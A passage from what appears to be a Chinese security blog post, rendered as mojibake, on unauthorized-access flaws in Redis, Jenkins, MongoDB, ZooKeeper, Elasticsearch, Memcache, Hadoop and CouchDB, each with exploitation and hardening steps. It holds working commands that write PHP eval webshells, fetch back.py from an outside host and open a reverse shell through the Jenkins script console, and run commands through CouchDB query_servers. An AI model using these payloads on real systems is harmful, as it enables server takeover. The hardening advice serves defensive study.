<p>1ã€RedisæœåŠ¡ä½¿ç”¨rootè´¦å·å¯åŠ¨<br>2ã€æœåŠ¡å™¨å¼€æ”¾äº†SSHæœåŠ¡ï¼Œè€Œä¸”å…è®¸ä½¿ç”¨å¯†é’¥ç™»å½•ï¼Œå³å¯è¿œç¨‹å†™å…¥ä¸€ä¸ªå…¬é’¥ï¼Œç›´æ¥ç™»å½•è¿œç¨‹æœåŠ¡å™¨ã€‚</p>
</blockquote>
<p>æ­¤æ–¹æ³•å…·ä½“å‚è€ƒï¼š<a href="https://www.secpulse.com/archives/40406.html" target="_blank" rel="external">redisé…ç½®ä¸å½“å¯ç›´æ¥å¯¼è‡´æœåŠ¡å™¨è¢«æ§åˆ¶</a><br><em>3ã€è·å–webæœåŠ¡çš„webshell</em><br>å½“redisæƒé™ä¸é«˜æ—¶ï¼Œå¹¶ä¸”æœåŠ¡å™¨å¼€ç€webæœåŠ¡ï¼Œåœ¨redisæœ‰webç›®å½•å†™æƒé™æ—¶ï¼Œå¯ä»¥å°è¯•å¾€webè·¯å¾„å†™webshellã€‚</p>
<p>æ‰§è¡Œä»¥ä¸‹å‘½ä»¤<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">config set dir /var/www/html/</div><div class="line">config set dbfilename shell.php</div><div class="line">set x &quot;&lt;?php @eval($_POST[&apos;caidao&apos;]);?&gt;&quot;</div><div class="line">save</div></pre></td></tr></table></figure></p>
<p>å³å¯å°†shellå†™å…¥webç›®å½•<br><img src="http://www.secpulse.com/wp-content/uploads/2017/09/redis-5.png" alt=""></p>
<h2 id="2-3-æ¼æ´åŠ å›º"><a href="#2-3-æ¼æ´åŠ å›º" class="headerlink" title="2.3 æ¼æ´åŠ å›º"></a>2.3 æ¼æ´åŠ å›º</h2><p>å¯ä»¥é…ç½®redis.confè¿™ä¸ªæ–‡ä»¶ï¼Œåœ¨å®‰è£…ç›®å½•ä¸‹</p>
<ul>
<li>é»˜è®¤åªå¯¹æœ¬åœ°å¼€æ”¾</li>
</ul>
<blockquote>
<p>bind 127.0.0.1</p>
</blockquote>
<ul>
<li>æ·»åŠ ç™»é™†å¯†ç </li>
</ul>
<blockquote>
<p>requirepass www.secpulse.com</p>
</blockquote>
<ul>
<li>åœ¨éœ€è¦å¯¹å¤–å¼€æ”¾çš„æ—¶å€™ä¿®æ”¹é»˜è®¤ç«¯å£</li>
</ul>
<blockquote>
<p>port 2333</p>
</blockquote>
<ul>
<li>æœ€åè¿˜å¯ä»¥é…åˆiptablesé™åˆ¶å¼€æ”¾</li>
</ul>
<h1 id="0x03-Jenkinsæœªæˆæƒè®¿é—®"><a href="#0x03-Jenkinsæœªæˆæƒè®¿é—®" class="headerlink" title="0x03 Jenkinsæœªæˆæƒè®¿é—®"></a>0x03 Jenkinsæœªæˆæƒè®¿é—®</h1><h2 id="3-1-æ¼æ´æè¿°"><a href="#3-1-æ¼æ´æè¿°" class="headerlink" title="3.1 æ¼æ´æè¿°"></a>3.1 æ¼æ´æè¿°</h2><p>é»˜è®¤æƒ…å†µä¸‹Jenkinsé¢æ¿ä¸­ç”¨æˆ·å¯ä»¥é€‰æ‹©æ‰§è¡Œè„šæœ¬ç•Œé¢æ¥æ“ä½œä¸€äº›ç³»ç»Ÿå±‚å‘½ä»¤ï¼Œæ”»å‡»è€…å¯é€šè¿‡æœªæˆæƒè®¿é—®æ¼æ´æˆ–è€…æš´åŠ›ç ´è§£ç”¨æˆ·å¯†ç ç­‰è¿›è„šæœ¬æ‰§è¡Œç•Œé¢ä»è€Œè·å–æœåŠ¡å™¨æƒé™ã€‚</p>
<h2 id="3-2-æ¼æ´åˆ©ç”¨"><a href="#3-2-æ¼æ´åˆ©ç”¨" class="headerlink" title="3.2 æ¼æ´åˆ©ç”¨"></a>3.2 æ¼æ´åˆ©ç”¨</h2><p><em>1ã€Jenkinsæœªæˆæƒè®¿é—®å¯æ‰§è¡Œå‘½ä»¤</em><br><a href="http://www.secpulse.com:8080/manage" target="_blank" rel="external">http://www.secpulse.com:8080/manage</a><br><a href="http://www.secpulse.com:8080/script" target="_blank" rel="external">http://www.secpulse.com:8080/script</a><br><img src="http://www.secpulse.com/wp-content/uploads/2017/09/jenkins-1.png" alt=""><br><strong>println â€œifconfig -aâ€.execute().text  æ‰§è¡Œä¸€äº›ç³»ç»Ÿå‘½ä»¤</strong><br><img src="http://www.secpulse.com/wp-content/uploads/2017/09/jenkins-2.png" alt=""><br><strong>ç›´æ¥wgetä¸‹è½½back.pyåå¼¹shell</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">println &quot;wget http://xxx.secpulse.com/tools/back.py -P /tmp/&quot;.execute().text</div><div class="line">println &quot;python /tmp/back.py 10.1.1.111 8080&quot;.execute().text</div><div class="line">back.pyå¹¶ä¸éœ€è¦rootæƒé™</div></pre></td></tr></table></figure></p>
<p><img src="http://www.secpulse.com/wp-content/uploads/2017/09/jenkins-3.png" alt=""><br><strong>ä¸æƒ³åå¼¹è¯•è¯•Terminal Plugin</strong><br><img src="http://www.secpulse.com/wp-content/uploads/2017/09/jenkins-4.png" alt=""><br><em>2ã€Jenkinsæœªæˆæƒè®¿é—®å†™shell</em><br><strong>jenskinsæ˜¯java webé¡¹ç›®,æˆ‘ä»¬ç”¨javaçš„Fileç±»å†™æ–‡ä»¶</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">new File(&quot;c://temp//secpulse.txt&quot;).write(&quot;&quot;&quot;</div><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">&quot;&quot;&quot;);</div></pre></td></tr></table></figure></p>
<p>æ–°å»ºä¸€ä¸ªå†…å®¹ä¸º1,2,3(æ¯ä¸€è¡Œ)çš„1.txtåˆ°cç›˜çš„tempæ–‡ä»¶å¤¹,è¿è¡Œå¦‚ä¸‹å‘½ä»¤<code>println â€œpowershell dir c:\tempâ€.execute().text</code>å¦‚æœå†™æˆåŠŸ,é‚£ä¹ˆsecpulse.txtå°±ä¼šåœ¨è¿”å›ç»“æœä¸­!<br><strong>wgetå†™webshell</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">1. println &quot;wget http://shell.secpulse.com/data/t.txt -o /var/www/html/secpulse.php&quot;.execute().text</div><div class="line">2. new File(&quot;/var/www/html/secpulse.php&quot;).write(&apos;&lt;?php @eval($_POST[s3cpu1se]);?&gt;&apos;);</div><div class="line">3. def webshell = &apos;&lt;?php @eval($_POST[s3cpu1se]);?&gt;&apos;</div><div class="line">new File(&quot;/var/www/html/secpulse.php&quot;).write(&quot;$webshell&quot;);</div><div class="line">4. def execute(cmd) &#123;</div><div class="line">def proc =  cmd.execute()</div><div class="line">proc.waitFor()</div><div class="line">&#125;</div><div class="line">execute( [ &apos;bash&apos;, &apos;-c&apos;, &apos;echo -n &quot;&lt;?php @eval($&quot; &gt; /usr/local/nginx_1119/html/secpulse.php&apos; ] )</div><div class="line">execute( [ &apos;bash&apos;, &apos;-c&apos;, &apos;echo &quot;_POST[s3cpu1se]);?&gt;&quot; &gt;&gt; /usr/local/nginx_1119/html/secpulse.php&apos; ] )</div><div class="line">//å‚æ•°-n ä¸è¦åœ¨æœ€åè‡ªåŠ¨æ¢è¡Œ</div></pre></td></tr></table></figure></p>
<p><img src="http://www.secpulse.com/wp-content/uploads/2017/09/jenkins-5.png" alt=""><br>Result: 0 è¡¨ç¤ºæˆåŠŸå†™å…¥</p>
<p>Result: 1 è¡¨ç¤ºç›®å½•ä¸å­˜åœ¨æˆ–è€…æƒé™ä¸è¶³ å†™å…¥å¤±è´¥</p>
<p>Result: 2 è¡¨ç¤ºæ„é€ æœ‰å¼‚å¸¸ å†™å…¥å¤±è´¥</p>
<p>å…·ä½“å…¶ä»–è¯¦ç»†åˆ©ç”¨æ–¹æ³•å‚è€ƒï¼š<a href="https://www.secpulse.com/archives/2166.html" target="_blank" rel="external">çŸ¥å…¶ä¸€ä¸çŸ¥å…¶äºŒä¹‹Jenkins Hacking</a></p>
<h2 id="3-3-æ¼æ´åŠ å›º"><a href="#3-3-æ¼æ´åŠ å›º" class="headerlink" title="3.3 æ¼æ´åŠ å›º"></a>3.3 æ¼æ´åŠ å›º</h2><ul>
<li>ç¦æ­¢æŠŠJenkinsç›´æ¥æš´éœ²åœ¨å…¬ç½‘</li>
<li>æ·»åŠ è®¤è¯ï¼Œå»ºè®®ä½¿ç”¨ç”¨æˆ·çŸ©é˜µæˆ–è€…ä¸JIRAæ‰“é€šï¼ŒJIRAè®¾ç½®å¯†ç å¤æ‚åº¦</li>
</ul>
<h1 id="0x04-MongoDBæœªæˆæƒè®¿é—®"><a href="#0x04-MongoDBæœªæˆæƒè®¿é—®" class="headerlink" title="0x04 MongoDBæœªæˆæƒè®¿é—®"></a>0x04 MongoDBæœªæˆæƒè®¿é—®</h1><h2 id="4-1-æ¼æ´æè¿°"><a href="#4-1-æ¼æ´æè¿°" class="headerlink" title="4.1 æ¼æ´æè¿°"></a>4.1 æ¼æ´æè¿°</h2><p>å¼€å¯MongoDBæœåŠ¡æ—¶ä¸æ·»åŠ ä»»ä½•å‚æ•°æ—¶,é»˜è®¤æ˜¯æ²¡æœ‰æƒé™éªŒè¯çš„,è€Œä¸”å¯ä»¥è¿œç¨‹è®¿é—®æ•°æ®åº“ï¼Œç™»å½•çš„ç”¨æˆ·å¯ä»¥é€šè¿‡é»˜è®¤ç«¯å£æ— éœ€å¯†ç å¯¹æ•°æ®åº“è¿›è¡Œå¢ã€åˆ ã€æ”¹ã€æŸ¥ç­‰ä»»æ„é«˜å±æ“ä½œã€‚</p>
<h2 id="4-2-æ¼æ´åˆ©ç”¨"><a href="#4-2-æ¼æ´åˆ©ç”¨" class="headerlink" title="4.2 æ¼æ´åˆ©ç”¨"></a>4.2 æ¼æ´åˆ©ç”¨</h2><p><img src="http://www.secpulse.com/wp-content/uploads/2017/09/mongodb-1.png" alt=""></p>
<h2 id="4-3-æ¼æ´åŠ å›º"><a href="#4-3-æ¼æ´åŠ å›º" class="headerlink" title="4.3 æ¼æ´åŠ å›º"></a>4.3 æ¼æ´åŠ å›º</h2><ul>
<li><p>ä¸ºMongoDBæ·»åŠ è®¤è¯ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">1)MongoDBå¯åŠ¨æ—¶æ·»åŠ --authå‚æ•°</div><div class="line">2)ç»™MongoDBæ·»åŠ ç”¨æˆ·ï¼š</div><div class="line">use admin  #ä½¿ç”¨adminåº“</div><div class="line">db.addUser(&quot;root&quot;, &quot;123456&quot;) #æ·»åŠ ç”¨æˆ·årootå¯†ç 123456çš„ç”¨æˆ·</div><div class="line">db.auth(&quot;root&quot;,&quot;123456&quot;) #éªŒè¯ä¸‹æ˜¯å¦æ·»åŠ æˆåŠŸï¼Œè¿”å›1è¯´æ˜æˆåŠŸ</div></pre></td></tr></table></figure>
</li>
<li><p>ç¦ç”¨HTTPå’ŒRESTç«¯å£</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">MongoDBè‡ªèº«å¸¦æœ‰ä¸€ä¸ªHTTPæœåŠ¡å’Œå¹¶æ”¯æŒRESTæ¥å£ã€‚åœ¨2.6ä»¥åè¿™äº›æ¥å£é»˜è®¤æ˜¯å…³é—­çš„ã€‚mongoDBé»˜è®¤ä¼šä½¿ç”¨é»˜è®¤ç«¯å£ç›‘å¬webæœåŠ¡ï¼Œä¸€èˆ¬ä¸éœ€è¦é€šè¿‡webæ–¹å¼è¿›è¡Œè¿œç¨‹ç®¡ç†ï¼Œå»ºè®®ç¦ç”¨ã€‚ä¿®æ”¹é…ç½®æ–‡ä»¶æˆ–åœ¨å¯åŠ¨çš„æ—¶å€™é€‰æ‹©â€“nohttpinterface å‚æ•°nohttpinterface=false</div></pre></td></tr></table></figure>
</li>
<li><p>é™åˆ¶ç»‘å®šIP</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">å¯åŠ¨æ—¶åŠ å…¥å‚æ•°</div><div class="line">--bind_ip 127.0.0.1</div><div class="line">æˆ–åœ¨/etc/mongodb.confæ–‡ä»¶ä¸­æ·»åŠ ä»¥ä¸‹å†…å®¹ï¼š</div><div class="line">bind_ip = 127.0.0.1</div></pre></td></tr></table></figure>
</li>
</ul>
<h1 id="0x05-ZooKeeperæœªæˆæƒè®¿é—®"><a href="#0x05-ZooKeeperæœªæˆæƒè®¿é—®" class="headerlink" title="0x05 ZooKeeperæœªæˆæƒè®¿é—®"></a>0x05 ZooKeeperæœªæˆæƒè®¿é—®</h1><h2 id="5-1-æ¼æ´æè¿°"><a href="#5-1-æ¼æ´æè¿°" class="headerlink" title="5.1 æ¼æ´æè¿°"></a>5.1 æ¼æ´æè¿°</h2><p>Zookeeperçš„é»˜è®¤å¼€æ”¾ç«¯å£æ˜¯2181ã€‚Zookeeperå®‰è£…éƒ¨ç½²ä¹‹åé»˜è®¤æƒ…å†µä¸‹ä¸éœ€è¦ä»»ä½•èº«ä»½éªŒè¯ï¼Œé€ æˆæ”»å‡»è€…å¯ä»¥è¿œç¨‹åˆ©ç”¨Zookeeperï¼Œé€šè¿‡æœåŠ¡å™¨æ”¶é›†æ•æ„Ÿä¿¡æ¯æˆ–è€…åœ¨Zookeeperé›†ç¾¤å†…è¿›è¡Œç ´åï¼ˆæ¯”å¦‚ï¼škillå‘½ä»¤ï¼‰ã€‚æ”»å‡»è€…èƒ½å¤Ÿæ‰§è¡Œæ‰€æœ‰åªå…è®¸ç”±ç®¡ç†å‘˜è¿è¡Œçš„å‘½ä»¤ã€‚</p>
<h2 id="5-2-æ¼æ´åˆ©ç”¨"><a href="#5-2-æ¼æ´åˆ©ç”¨" class="headerlink" title="5.2 æ¼æ´åˆ©ç”¨"></a>5.2 æ¼æ´åˆ©ç”¨</h2><p>æ‰§è¡Œä»¥ä¸‹å‘½ä»¤å³å¯è¿œç¨‹è·å–è¯¥æœåŠ¡å™¨çš„ç¯å¢ƒï¼š</p>
<blockquote>
<p>echo envi | nc ip port</p>
</blockquote>
<p><img src="http://www.secpulse.com/wp-content/uploads/2017/09/zookeeper-1.jpg" alt=""><br>ç›´æ¥è¿æ¥ï¼š</p>
<blockquote>
<p>./zkCli.sh -server ip:port</p>
</blockquote>
<p><img src="http://www.secpulse.com/wp-content/uploads/2017/09/zookeeper-2.png" alt=""></p>
<h2 id="5-3-æ¼æ´åŠ å›º"><a href="#5-3-æ¼æ´åŠ å›º" class="headerlink" title="5.3 æ¼æ´åŠ å›º"></a>5.3 æ¼æ´åŠ å›º</h2><ul>
<li>ç¦æ­¢æŠŠZookeeperç›´æ¥æš´éœ²åœ¨å…¬ç½‘</li>
<li>æ·»åŠ è®¿é—®æ§åˆ¶ï¼Œæ ¹æ®æƒ…å†µé€‰æ‹©å¯¹åº”æ–¹å¼ï¼ˆè®¤è¯ç”¨æˆ·ï¼Œç”¨æˆ·åå¯†ç ï¼‰</li>
<li>ç»‘å®šæŒ‡å®šIPè®¿é—®</li>
</ul>
<h1 id="0x06-Elasticsearchæœªæˆæƒè®¿é—®"><a href="#0x06-Elasticsearchæœªæˆæƒè®¿é—®" class="headerlink" title="0x06 Elasticsearchæœªæˆæƒè®¿é—®"></a>0x06 Elasticsearchæœªæˆæƒè®¿é—®</h1><h2 id="6-1-æ¼æ´æè¿°"><a href="#6-1-æ¼æ´æè¿°" class="headerlink" title="6.1 æ¼æ´æè¿°"></a>6.1 æ¼æ´æè¿°</h2><p>Elasticsearchæ˜¯ä¸€æ¬¾javaç¼–å†™çš„ä¼ä¸šçº§æœç´¢æœåŠ¡ã€‚è¶Šæ¥è¶Šå¤šçš„å…¬å¸ä½¿ç”¨ELKä½œä¸ºæ—¥å¿—åˆ†æï¼Œå¯åŠ¨æ­¤æœåŠ¡é»˜è®¤ä¼šå¼€æ”¾9200ç«¯å£ï¼Œå¯è¢«éæ³•æ“ä½œæ•°æ®</p>
<h2 id="6-2-æ¼æ´åˆ©ç”¨"><a href="#6-2-æ¼æ´åˆ©ç”¨" class="headerlink" title="6.2 æ¼æ´åˆ©ç”¨"></a>6.2 æ¼æ´åˆ©ç”¨</h2><p>æ¼æ´æ£€æµ‹ï¼šé»˜è®¤ç«¯å£9200</p>
<p>ç›¸å½“äºä¸€ä¸ªAPIï¼Œä»»ä½•äººè®¿é—®è¿™ä¸ªåœ°å€ï¼Œå°±å¯ä»¥è°ƒç”¨apiï¼Œè¿›è¡Œæ•°æ®çš„å¢åˆ æ”¹æ“ä½œã€‚</p>
<p><a href="http://x.x.x.x:9200/_nodes" target="_blank" rel="external">http://x.x.x.x:9200/_nodes</a></p>
<p><a href="http://x.x.x.x:9200/_river" target="_blank" rel="external">http://x.x.x.x:9200/_river</a><br><img src="http://www.secpulse.com/wp-content/uploads/2017/09/elasticsearch-1.png" alt=""></p>
<h2 id="6-3-æ¼æ´åŠ å›º"><a href="#6-3-æ¼æ´åŠ å›º" class="headerlink" title="6.3 æ¼æ´åŠ å›º"></a>6.3 æ¼æ´åŠ å›º</h2><ul>
<li>é˜²ç«å¢™ä¸Šè®¾ç½®ç¦æ­¢å¤–ç½‘è®¿é—®æ­¤ç«¯å£ã€‚</li>
<li>ä½¿ç”¨Nginxæ­å»ºåå‘ä»£ç†ï¼Œé€šè¿‡é…ç½®Nginxå®ç°å¯¹Elasticsearchçš„è®¤è¯</li>
<li>åœ¨config/elasticsearch.ymlä¸­ä¸º9200ç«¯å£è®¾ç½®è®¤è¯ï¼š</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">http.basic.enabled     true     #å¼€å…³ï¼Œå¼€å¯ä¼šæ¥ç®¡å…¨éƒ¨HTTPè¿æ¥</div><div class="line">http.basic.user     &quot;admin&quot;     #è´¦å·</div><div class="line">http.basic.password     &quot;admin_pw&quot;     #å¯†ç </div><div class="line">http.basic.ipwhitelist     [&quot;localhost&quot;, &quot;127.0.0.1&quot;]</div></pre></td></tr></table></figure>
<h1 id="0x07-Memcacheæœªæˆæƒè®¿é—®"><a href="#0x07-Memcacheæœªæˆæƒè®¿é—®" class="headerlink" title="0x07 Memcacheæœªæˆæƒè®¿é—®"></a>0x07 Memcacheæœªæˆæƒè®¿é—®</h1><h2 id="7-1-æ¼æ´æè¿°"><a href="#7-1-æ¼æ´æè¿°" class="headerlink" title="7.1 æ¼æ´æè¿°"></a>7.1 æ¼æ´æè¿°</h2><p>Memcachedæ˜¯ä¸€å¥—å¸¸ç”¨çš„key-valueç¼“å­˜ç³»ç»Ÿï¼Œç”±äºå®ƒæœ¬èº«æ²¡æœ‰æƒé™æ§åˆ¶æ¨¡å—ï¼Œæ‰€ä»¥å¯¹å…¬ç½‘å¼€æ”¾çš„MemcacheæœåŠ¡å¾ˆå®¹æ˜“è¢«æ”»å‡»è€…æ‰«æå‘ç°ï¼Œæ”»å‡»è€…é€šè¿‡å‘½ä»¤äº¤äº’å¯ç›´æ¥è¯»å–Memcachedä¸­çš„æ•æ„Ÿä¿¡æ¯ã€‚</p>
<h2 id="7-2-æ¼æ´åˆ©ç”¨"><a href="#7-2-æ¼æ´åˆ©ç”¨" class="headerlink" title="7.2 æ¼æ´åˆ©ç”¨"></a>7.2 æ¼æ´åˆ©ç”¨</h2><p>1ã€ç™»å½•æœºå™¨æ‰§è¡Œnetstat -an |moreå‘½ä»¤æŸ¥çœ‹ç«¯å£ç›‘å¬æƒ…å†µã€‚å›æ˜¾0.0.0.0:11211è¡¨ç¤ºåœ¨æ‰€æœ‰ç½‘å¡è¿›è¡Œç›‘å¬ï¼Œå­˜åœ¨memcachedæœªæˆæƒè®¿é—®æ¼æ´ã€‚</p>
<p>2ã€telnet <target> 11211ï¼Œæˆ–nc -vv <target> 11211ï¼Œæç¤ºè¿æ¥æˆåŠŸè¡¨ç¤ºæ¼æ´å­˜åœ¨<br><img src="http://www.secpulse.com/wp-content/uploads/2017/09/memcached-2.png" alt=""></target></target></p>
<h2 id="7-3-æ¼æ´åŠ å›º"><a href="#7-3-æ¼æ´åŠ å›º" class="headerlink" title="7.3 æ¼æ´åŠ å›º"></a>7.3 æ¼æ´åŠ å›º</h2><ul>
<li>è®¾ç½®memchachedåªå…è®¸æœ¬åœ°è®¿é—®</li>
<li>ç¦æ­¢å¤–ç½‘è®¿é—®Memcached 11211ç«¯å£</li>
<li>ç¼–è¯‘æ—¶åŠ ä¸Šâ€“enable-saslï¼Œå¯ç”¨SASLè®¤è¯</li>
</ul>
<h1 id="0x08-Hadoopæœªæˆæƒè®¿é—®"><a href="#0x08-Hadoopæœªæˆæƒè®¿é—®" class="headerlink" title="0x08 Hadoopæœªæˆæƒè®¿é—®"></a>0x08 Hadoopæœªæˆæƒè®¿é—®</h1><h2 id="8-1-æ¼æ´æè¿°"><a href="#8-1-æ¼æ´æè¿°" class="headerlink" title="8.1 æ¼æ´æè¿°"></a>8.1 æ¼æ´æè¿°</h2><p>ç”±äºæœåŠ¡å™¨ç›´æ¥åœ¨å¼€æ”¾äº†Hadoopæœºå™¨HDFSçš„50070 webç«¯å£åŠéƒ¨åˆ†é»˜è®¤æœåŠ¡ç«¯å£ï¼Œé»‘å®¢å¯ä»¥é€šè¿‡å‘½ä»¤è¡Œæ“ä½œå¤šä¸ªç›®å½•ä¸‹çš„æ•°æ®ï¼Œå¦‚è¿›è¡Œåˆ é™¤ï¼Œä¸‹è½½ï¼Œç›®å½•æµè§ˆç”šè‡³å‘½ä»¤æ‰§è¡Œç­‰æ“ä½œï¼Œäº§ç”Ÿæå¤§çš„å±å®³ã€‚</p>
<h2 id="8-2-æ¼æ´åˆ©ç”¨"><a href="#8-2-æ¼æ´åˆ©ç”¨" class="headerlink" title="8.2 æ¼æ´åˆ©ç”¨"></a>8.2 æ¼æ´åˆ©ç”¨</h2><p>ä¸»è¦HDFSå’ŒMapReduceçš„WebUIå¯¹åº”çš„æœåŠ¡ç«¯å£ã€‚<br><img src="http://www.secpulse.com/wp-content/uploads/2017/09/Hadoop-1.png" alt=""><br>å…¶ä¸­æ¯”è¾ƒé‡è¦çš„æ˜¯DataNode é»˜è®¤ç«¯å£50075å¼€æ”¾çš„è¯ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡hdsfæä¾›çš„restful apiå¯¹hdfså­˜å‚¨æ•°æ®è¿›è¡Œæ“ä½œã€‚</p>
<p>restful apiå‚è€ƒï¼š<a href="http://hadoop.apache.org/docs/r1.0.4/webhdfs.html" target="_blank" rel="external">http://hadoop.apache.org/docs/r1.0.4/webhdfs.html</a></p>
<h2 id="8-3-æ¼æ´åŠ å›º"><a href="#8-3-æ¼æ´åŠ å›º" class="headerlink" title="8.3 æ¼æ´åŠ å›º"></a>8.3 æ¼æ´åŠ å›º</h2><ul>
<li>å¦‚æ— å¿…è¦ï¼Œå…³é—­Hadoop Webç®¡ç†é¡µé¢</li>
<li>å¼€å¯èº«ä»½éªŒè¯ï¼Œé˜²æ­¢æœªç»æˆæƒç”¨æˆ·è®¿é—®</li>
<li>è®¾ç½®â€œå®‰å…¨ç»„â€è®¿é—®æ§åˆ¶ç­–ç•¥ï¼Œå°†Hadoopé»˜è®¤å¼€æ”¾çš„å¤šä¸ªç«¯å£å¯¹å…¬ç½‘å…¨éƒ¨ç¦æ­¢æˆ–é™åˆ¶å¯ä¿¡ä»»çš„IPåœ°å€æ‰èƒ½è®¿é—®åŒ…æ‹¬50070ä»¥åŠWebUIç­‰ç›¸å…³ç«¯å£ï¼Œè¯¦ç»†ç«¯å£åˆ—è¡¨å¦‚ä¸‹ï¼š</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">a)HDFS</div><div class="line">NameNode é»˜è®¤ç«¯å£ 50070</div><div class="line">DataNode é»˜è®¤ç«¯å£ 50075</div><div class="line">httpfs é»˜è®¤ç«¯å£14000</div><div class="line">journalnode é»˜è®¤ç«¯å£ 8480</div><div class="line">b)YARNï¼ˆJobTrackerï¼‰</div><div class="line">ResourceManager é»˜è®¤ç«¯å£8088</div><div class="line">JobTracker é»˜è®¤ç«¯å£ 50030</div><div class="line">TaskTracker é»˜è®¤ç«¯å£ 50060</div><div class="line">c)Hue é»˜è®¤ç«¯å£ 8080</div><div class="line">d)YARNï¼ˆJobTrackerï¼‰</div><div class="line">master é»˜è®¤ç«¯å£ 60010</div><div class="line">regionserver é»˜è®¤ç«¯å£60030</div><div class="line">e)hive-server2 é»˜è®¤ç«¯å£ 10000</div><div class="line">f)spark-jdbcserver é»˜è®¤ç«¯å£ 10003</div></pre></td></tr></table></figure>
<h1 id="0x09-CouchDBæœªæˆæƒè®¿é—®"><a href="#0x09-CouchDBæœªæˆæƒè®¿é—®" class="headerlink" title="0x09 CouchDBæœªæˆæƒè®¿é—®"></a>0x09 CouchDBæœªæˆæƒè®¿é—®</h1><h2 id="9-1-æ¼æ´æè¿°"><a href="#9-1-æ¼æ´æè¿°" class="headerlink" title="9.1 æ¼æ´æè¿°"></a>9.1 æ¼æ´æè¿°</h2><p>CouchDBé»˜è®¤åœ¨5984ç«¯å£å¼€æ”¾Restfulçš„APIæ¥å£ï¼Œç”¨äºæ•°æ®åº“çš„ç®¡ç†åŠŸèƒ½ã€‚å…¶HTTP Serveré»˜è®¤å¼€å¯æ—¶æ²¡æœ‰è¿›è¡ŒéªŒè¯ï¼Œè€Œä¸”ç»‘å®šåœ¨0.0.0.0ï¼Œæ‰€æœ‰ç”¨æˆ·å‡å¯é€šè¿‡APIè®¿é—®å¯¼è‡´æœªæˆæƒè®¿é—®ã€‚ä»»ä½•è¿æ¥åˆ°æœåŠ¡å™¨ç«¯å£ä¸Šçš„äººï¼Œéƒ½å¯ä»¥è°ƒç”¨ç›¸å…³APIå¯¹æœåŠ¡å™¨ä¸Šçš„æ•°æ®è¿›è¡Œä»»æ„çš„å¢åˆ æ”¹æŸ¥ï¼Œå…¶ä¸­é€šè¿‡APIä¿®æ”¹local.inié…ç½®æ–‡ä»¶ï¼Œå¯è¿›ä¸€æ­¥å¯¼è‡´æ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ï¼Œè·å–æœåŠ¡å™¨æƒé™ï¼</p>
<h2 id="9-2-æ¼æ´åˆ©ç”¨"><a href="#9-2-æ¼æ´åˆ©ç”¨" class="headerlink" title="9.2 æ¼æ´åˆ©ç”¨"></a>9.2 æ¼æ´åˆ©ç”¨</h2><p><img src="http://www.secpulse.com/wp-content/uploads/2017/09/couchdb-7.png" alt=""><br>æ–°å¢query_serveré…ç½®ï¼Œè¿™é‡Œæ‰§è¡Œifconfigå‘½ä»¤</p>
<blockquote>
<p>curl -X PUT â€˜<a href="http://x.x.x.x:5984/_config/query_servers/cmd" target="_blank" rel="external">http://x.x.x.x:5984/_config/query_servers/cmd</a>â€˜ -d â€˜â€œ/sbin/ifconfig &gt;/tmp/6666â€â€˜</p>
</blockquote>
<p>æ–°å»ºä¸€ä¸ªä¸´æ—¶è¡¨ï¼Œæ’å…¥ä¸€æ¡è®°å½•<br><img src="http://www.secpulse.com/wp-content/uploads/2017/09/couchdb-11.png" alt=""></p>
<blockquote>
<p>curl -X PUT â€˜<a href="http://x.x.x.x:5984/vultest" target="_blank" rel="external">http://x.x.x.x:5984/vultest</a>â€˜</p>
</blockquote>
<p><img src="http://www.secpulse.com/wp-content/uploads/2017/09/couchdb-2.png" alt=""></p>
<blockquote>
<p>curl -X PUT â€˜<a href="http://x.x.x.x:5984/vultest/vul" target="_blank" rel="external">http://x.x.x.x:5984/vultest/vul</a>â€˜ -d â€˜{â€œ_idâ€:â€770895a97726d5ca6d70a22173005c7bâ€}â€™</p>
</blockquote>
<p>è°ƒç”¨query_serverå¤„ç†æ•°æ®<br><img src="http://www.secpulse.com/wp-content/uploads/2017/09/couchdb-3.png" alt=""></p>
<blockquote>
<p>curl -X POST â€˜<a href="http://x.x.x.x:5984/vultest/_temp_view?limit=11" target="_blank" rel="external">http://x.x.x.x:5984/vultest/_temp_view?limit=11</a>â€˜ -d â€˜{â€œlanguageâ€:â€cmdâ€,â€mapâ€:â€â€}â€™ -H â€˜Content-Type: application/jsonâ€™</p>
</blockquote>
